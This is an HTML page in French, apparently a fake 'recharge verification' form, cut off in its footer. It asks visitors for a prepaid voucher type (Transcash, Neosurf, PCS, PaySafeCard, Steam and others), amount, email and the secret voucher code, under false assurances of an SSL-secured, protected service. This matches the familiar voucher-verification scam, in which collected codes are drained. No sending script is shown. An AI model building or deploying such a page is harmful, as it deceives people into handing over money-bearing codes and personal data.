<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Verification de rechargeForm</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Satoshi:wght@300;400;500;600;700;800&display=swap');
  
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  
  :root {
    --primary: #6366f1;
    --primary-dark: #4f46e5;
    --primary-light: #a5b4fc;
    --secondary: #f1f5f9;
    --accent: #3b82f6;
    --gold: #f59e0b;
    --success: #10b981;
    --error: #ef4444;
    --warning: #f59e0b;
    --text-primary: #0f172a;
    --text-secondary: #64748b;
    --text-light: #94a3b8;
    --border: #e2e8f0;
    --surface: #ffffff;
    --glass: rgba(255, 255, 255, 0.25);
    --glass-border: rgba(255, 255, 255, 0.18);
    --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
    --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
    --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
    --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
    --shadow-2xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
  }
  
  body {
    font-family: 'Satoshi', -apple-system, BlinkMacSystemFont, sans-serif;
    background: 
      radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3), transparent 50%),
      radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3), transparent 50%),
      radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.3), transparent 50%),
      linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 1rem;
    line-height: 1.6;
    overflow-x: hidden;
  }
  
  .floating-shapes {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    z-index: 0;
  }
  
  .shape {
    position: absolute;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--glass), transparent);
    backdrop-filter: blur(10px);
    animation: float 6s ease-in-out infinite;
  }
  
  .shape:nth-child(1) {
    width: 80px;
    height: 80px;
    top: 10%;
    left: 10%;
    animation-delay: 0s;
  }
  
  .shape:nth-child(2) {
    width: 60px;
    height: 60px;
    top: 20%;
    right: 10%;
    animation-delay: 2s;
  }
  
  .shape:nth-child(3) {
    width: 40px;
    height: 40px;
    bottom: 30%;
    left: 20%;
    animation-delay: 4s;
  }
  
  .shape:nth-child(4) {
    width: 100px;
    height: 100px;
    bottom: 10%;
    right: 20%;
    animation-delay: 1s;
  }
  
  @keyframes float {
    0%, 100% { transform: translateY(0px) rotate(0deg); }
    33% { transform: translateY(-20px) rotate(120deg); }
    66% { transform: translateY(10px) rotate(240deg); }
  }
  
  .main-container {
    background: var(--glass);
    backdrop-filter: blur(20px);
    border: 1px solid var(--glass-border);
    border-radius: 24px;
    box-shadow: var(--shadow-2xl);
    overflow: hidden;
    width: 100%;
    max-width: 520px;
    position: relative;
    z-index: 10;
    transform: translateY(0);
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
  }
  
  .main-container:hover {
    transform: translateY(-5px);
    box-shadow: 0 32px 64px -12px rgba(0, 0, 0, 0.25);
  }
  
  .header {
    background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 50%, var(--primary-dark) 100%);
    padding: 3rem 2rem 2rem;
    text-align: center;
    color: white;
    position: relative;
    overflow: hidden;
  }
  
  .header::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: 
      radial-gradient(circle at 30% 20%, rgba(255, 255, 255, 0.2) 0%, transparent 50%),
      radial-gradient(circle at 70% 80%, rgba(255, 255, 255, 0.1) 0%, transparent 50%);
    animation: shimmer 3s ease-in-out infinite;
  }
  
  @keyframes shimmer {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.8; }
  }
  
  .header-content {
    position: relative;
    z-index: 2;
  }
  
  .logo-container {
    margin-bottom: 1.5rem;
    position: relative;
  }
  
  .logo {
    width: 64px;
    height: 64px;
    background: var(--glass);
    backdrop-filter: blur(15px);
    border: 2px solid var(--glass-border);
    border-radius: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto;
    position: relative;
    transition: all 0.3s ease;
  }
  
  .logo:hover {
    transform: scale(1.05) rotate(5deg);
  }
  
  .logo::after {
    content: '';
    position: absolute;
    inset: -2px;
    border-radius: 22px;
    padding: 2px;
    background: linear-gradient(45deg, var(--gold), var(--primary-light), var(--gold));
    mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
    mask-composite: exclude;
    animation: rotate 4s linear infinite;
  }
  
  @keyframes rotate {
    to { transform: rotate(360deg); }
  }
  
  .logo svg {
    width: 28px;
    height: 28px;
    fill: white;
    filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
  }
  
  .premium-badge {
    display: inline-flex;
    align-items: center;
    gap: 0.5rem;
    background: var(--gold);
    color: var(--text-primary);
    padding: 0.375rem 0.875rem;
    border-radius: 12px;
    font-size: 0.75rem;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    margin-bottom: 1rem;
    box-shadow: var(--shadow-md);
  }
  
  .header h1 {
    font-size: 2rem;
    font-weight: 700;
    margin-bottom: 0.5rem;
    letter-spacing: -0.05em;
    background: linear-gradient(135deg, #fff, #e0e7ff);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
  }
  
  .header p {
    font-size: 1rem;
    opacity: 0.9;
    font-weight: 400;
    letter-spacing: -0.025em;
  }
  
  .form-container {
    padding: 2.5rem;
    background: var(--surface);
  }
  
  .form-grid {
    display: grid;
    gap: 2rem;
  }
  
  .form-group {
    position: relative;
  }
  
  .form-group.half {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 1rem;
  }
  
  .input-group {
    position: relative;
  }
  
  label {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-weight: 600;
    font-size: 0.875rem;
    color: var(--text-primary);
    margin-bottom: 0.75rem;
    letter-spacing: -0.025em;
  }
  
  .label-icon {
    width: 16px;
    height: 16px;
    color: var(--primary);
  }
  
  .input-wrapper {
    position: relative;
    transition: all 0.3s ease;
  }
  
  .input-wrapper::before {
    content: '';
    position: absolute;
    inset: 0;
    border-radius: 16px;
    padding: 2px;
    background: linear-gradient(135deg, var(--primary), var(--accent));
    mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
    mask-composite: exclude;
    opacity: 0;
    transition: opacity 0.3s ease;
  }
  
  .input-wrapper:focus-within::before {
    opacity: 1;
  }
  
  select, input {
    width: 100%;
    padding: 1rem 1.25rem;
    border: 2px solid var(--border);
    border-radius: 16px;
    font-size: 1rem;
    font-family: inherit;
    font-weight: 500;
    background: var(--surface);
    color: var(--text-primary);
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    outline: none;
    position: relative;
  }
  
  select:focus, input:focus {
    border-color: transparent;
    transform: translateY(-2px);
    box-shadow: 0 8px 25px -8px rgba(99, 102, 241, 0.35);
  }
  
  select:hover, input:hover {
    border-color: var(--primary-light);
    transform: translateY(-1px);
  }
  
  select {
    cursor: pointer;
    appearance: none;
    background-image: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="%236366f1" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19.5 8.25l-7.5 7.5-7.5-7.5"/></svg>');
    background-repeat: no-repeat;
    background-position: right 1rem center;
    background-size: 1.25rem;
    padding-right: 3rem;
  }
  
  input::placeholder {
    color: var(--text-light);
    font-weight: 400;
  }
  
  .input-icon {
    position: absolute;
    left: 1rem;
    top: 50%;
    transform: translateY(-50%);
    width: 20px;
    height: 20px;
    color: var(--text-secondary);
    pointer-events: none;
    transition: color 0.3s ease;
  }
  
  .input-wrapper:focus-within .input-icon {
    color: var(--primary);
  }
  
  .has-icon input {
    padding-left: 3rem;
  }
  
  .error-message {
    color: var(--error);
    font-size: 0.8125rem;
    margin-top: 0.75rem;
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-weight: 500;
    opacity: 0;
    transform: translateY(-10px);
    transition: all 0.3s ease;
  }
  
  .error-message.show {
    opacity: 1;
    transform: translateY(0);
  }
  
  .error-message svg {
    width: 16px;
    height: 16px;
    flex-shrink: 0;
  }
  
  .input-wrapper.error select,
  .input-wrapper.error input {
    border-color: var(--error);
    background: rgba(239, 68, 68, 0.05);
  }
  
  .input-wrapper.error::before {
    background: linear-gradient(135deg, var(--error), #f87171);
    opacity: 1;
  }
  
  .submit-section {
    margin-top: 1rem;
  }
  
  .submit-btn {
    width: 100%;
    padding: 1.125rem 2rem;
    background: linear-gradient(135deg, var(--primary), var(--accent));
    color: white;
    border: none;
    border-radius: 16px;
    font-size: 1.0625rem;
    font-weight: 700;
    font-family: inherit;
    cursor: pointer;
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    letter-spacing: -0.025em;
    position: relative;
    overflow: hidden;
    box-shadow: var(--shadow-md);
  }
  
  .submit-btn::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
    transition: left 0.6s ease;
  }
  
  .submit-btn:hover {
    transform: translateY(-3px);
    box-shadow: 0 12px 25px -5px rgba(99, 102, 241, 0.4);
  }
  
  .submit-btn:hover::before {
    left: 100%;
  }
  
  .submit-btn:active {
    transform: translateY(-1px);
  }
  
  .submit-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
    transform: none;
  }
  
  .btn-content {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.75rem;
  }
  
  .loading-spinner {
    width: 20px;
    height: 20px;
    border: 2px solid rgba(255, 255, 255, 0.3);
    border-top: 2px solid white;
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }
  
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  
  .footer {
    padding: 2rem 2.5rem;
    background: var(--secondary);
    border-top: 1px solid var(--border);
  }
  
  .security-info {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 1.5rem;
    margin-bottom: 1.5rem;
  }
  
  .security-item {
    display: flex;
    align-items: center;
    gap: 0.75rem;
    padding: 1rem;
    background: var(--surface);
    border-radius: 12px;
    box-shadow: var(--shadow-sm);
    transition: all 0.3s ease;
  }
  
  .security-item:hover {
    transform: translateY(-2px);
    box-shadow: var(--shadow-md);
  }
  
  .security-icon {
    width: 24px;
    height: 24px;
    color: var(--success);
    flex-shrink: 0;
  }
  
  .security-text {
    font-size: 0.8125rem;
    font-weight: 500;
    color: var(--text-secondary);
  }
  
  .trust-badges {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 1rem;
    flex-wrap: wrap;
  }
  
  .trust-badge {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    padding: 0.5rem 1rem;
    background: var(--surface);
    border-radius: 8px;
    font-size: 0.75rem;
    font-weight: 600;
    color: var(--text-secondary);
    box-shadow: var(--shadow-sm);
  }
  
  .fade-in {
    animation: fadeInUp 0.6s cubic-bezier(0.4, 0, 0.2, 1);
  }
  
  @keyframes fadeInUp {
    from {
      opacity: 0;
      transform: translateY(30px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  
  .shake {
    animation: shake 0.6s cubic-bezier(0.36, 0.07, 0.19, 0.97);
  }
  
  @keyframes shake {
    10%, 90% { transform: translate3d(-1px, 0, 0); }
    20%, 80% { transform: translate3d(2px, 0, 0); }
    30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
    40%, 60% { transform: translate3d(4px, 0, 0); }
  }
  
  @media (max-width: 640px) {
    .main-container {
      margin: 0.5rem;
      border-radius: 20px;
    }
    
    .header {
      padding: 2rem 1.5rem 1.5rem;
    }
    
    .header h1 {
      font-size: 1.5rem;
    }
    
    .form-container {
      padding: 2rem 1.5rem;
    }
    
    .form-group.half {
      grid-template-columns: 1fr;
    }
    
    .security-info {
      grid-template-columns: 1fr;
    }
    
    .footer {
      padding: 1.5rem;
    }
  }
</style>
</head>
<body>
  <div class="floating-shapes">
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
  </div>

  <div class="main-container fade-in">
    <div class="header">
      <div class="header-content">
        <div class="logo-container">
          
          <div class="logo">
            <svg viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
            </svg>
          </div>
        </div>
        <h1>Vérification de recharge</h1>
      </div>
    </div>
    
    <div class="form-container">
      <form id="rechargeForm" novalidate>
        <div class="form-grid">
          <div class="form-group">
            <label for="typeRecharge">
              <svg class="label-icon" viewBox="0 0 24 24" fill="currentColor">
                <path d="M2 17h20v2H2zm1.15-4.05L4 11l.85 1.95.66-.75c.58-.58 1.52-.58 2.1 0L9 13.6l3.25-3.25c.58-.58 1.52-.58 2.1 0l4.25 4.25c.58.58.58 1.52 0 2.1L17.75 17.5 16 15.75l-2.25 2.25c-.58.58-1.52.58-2.1 0L9 15.35 7.6 16.75c-.58.58-1.52.58-2.1 0L3.15 14.4c-.58-.58-.58-1.52 0-2.1z"/>
              </svg>
              Type de recharge
            </label>
            <div class="input-wrapper">
              <select id="typeRecharge" name="typeRecharge" required>
                <option value="" disabled selected>Sélectionnez votre type de recharge</option>
                <option value="Transcash">💳 Transcash</option>
                <option value="Néo Surf">🌊 Néo Surf</option>
                <option value="PCS">💎 PCS Mastercard</option>
                <option value="Steam Carte">🎮 Steam Wallet</option>
                <option value="PaySafeCard">🔐 PaySafeCard</option>
                <option value="Ukash">💰 Ukash</option>
                <option value="Skrill">⚡ Skrill</option>
                <option value="Neteller">🔵 Neteller</option>
              </select>
            </div>
            <div class="error-message" id="typeError">
              <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
              </svg>
              <span></span>
            </div>
          </div>

          <div class="form-group half">
            <div class="input-group">
              <label for="montant">
                <svg class="label-icon" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/>
                </svg>
                Montant (€)
              </label>
              <div class="input-wrapper">
                <input type="number" id="montant" name="montant" placeholder="Ex: 50" min="5" max="2000" step="5" required />
              </div>
              <div class="error-message" id="montantError">
                <svg viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                </svg>
                <span></span>
              </div>
            </div>

            <div class="input-group">
              <label for="devise">
                <svg class="label-icon" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM13.64 8.4c1.53.15 2.87.89 3.64 1.98l-1.43 1.43c-.53-.69-1.28-1.16-2.21-1.27V8.4zm-3.28 0v2.14c-.93.11-1.68.58-2.21 1.27L6.72 10.38c.77-1.09 2.11-1.83 3.64-1.98zM12 15c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3z"/>
                </svg>
                Devise
              </label>
              <div class="input-wrapper">
                <select id="devise" name="devise" required>
                  <option value="EUR" selected>🇪🇺 Euro (EUR)</option>
                  <option value="USD">🇺🇸 Dollar (USD)</option>
                  <option value="GBP">🇬🇧 Livre (GBP)</option>
                  <option value="CHF">🇨🇭 Franc (CHF)</option>
                </select>
              </div>
            </div>
          </div>

          <div class="form-group">
            <label for="email">
              <svg class="label-icon" viewBox="0 0 24 24" fill="currentColor">
                <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
              </svg>
              Adresse e-mail
            </label>
            <div class="input-wrapper">
              <input type="email" id="email" name="email" placeholder="votre.email@exemple.com" required />
            </div>
            <div class="error-message" id="emailError">
              <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
              </svg>
              <span></span>
            </div>
          </div>

          <div class="form-group">
            <label for="codeRecharge">
              <svg class="label-icon" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
              </svg>
              Code de recharge
            </label>
            <div class="input-wrapper">
              <input type="text" id="codeRecharge" name="codeRecharge" placeholder="Saisissez votre code unique" maxlength="50" required />
            </div>
            <div class="error-message" id="codeError">
              <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm"/>
              </svg>
              <span></span>
            </div>
          </div>
        </div>

        <div class="submit-section">
          <button type="submit" class="submit-btn">
            Vérifier et Valider
          </button>
        </div>
      </form>
    </div>

    <div class="footer">
      <div class="security-info">
        <div class="security-item">
          <svg class="security-icon" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
          </svg>
          <span class="security-text">Connexion sécurisée SSL • Données protégées</span>
        </div>
